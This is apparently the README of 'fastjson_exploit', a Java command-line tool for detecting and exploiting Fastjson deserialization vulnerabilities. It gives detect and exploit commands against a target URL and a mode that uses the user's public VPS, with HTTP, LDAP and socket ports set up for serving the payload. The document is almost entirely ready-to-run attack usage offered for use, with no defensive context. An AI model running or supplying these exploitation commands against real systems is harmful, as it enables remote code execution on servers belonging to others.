# fastjson_exploit
Fastjson 反序列化漏洞快速检测和利用工具

检测：
java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar  -u 目标url

利用：
java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -u 目标url 

vps环境:
java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -H vps公网ip -u 目标url  

详细参数:
java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -h

usage: java -jar fastjson_exploit.jar [-H ip/vps_ip][-hp http_port][-lp
            ldap_port][-sp socket_port][-p
            params_name][-e/--exploit][-h/--help] -u/--url url
 -c,--cookie <arg>       The cookie of fastjson target.
 -e,--exploit            exploit,default is check.
 -h,--help               print help.
 -H,--host <arg>         The address of server(ip or domain).
 -hp,--http_port <arg>   The port of jetty server.
 -lp,--ldap_port <arg>   The port of ldap server.
 -p,--params <arg>       The params of fastjson target.
 -u,--url <arg>          The url of fastjson target.


详细文档:
http://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000244&idx=1&sn=801c947da8f74a4bda5039994951f040&chksm=685ca31c5f2b2a0a414e2848cc7f6e5a6778bbd309fc8d46bb4f4c7769d9f43ae06e0bae4959#rd
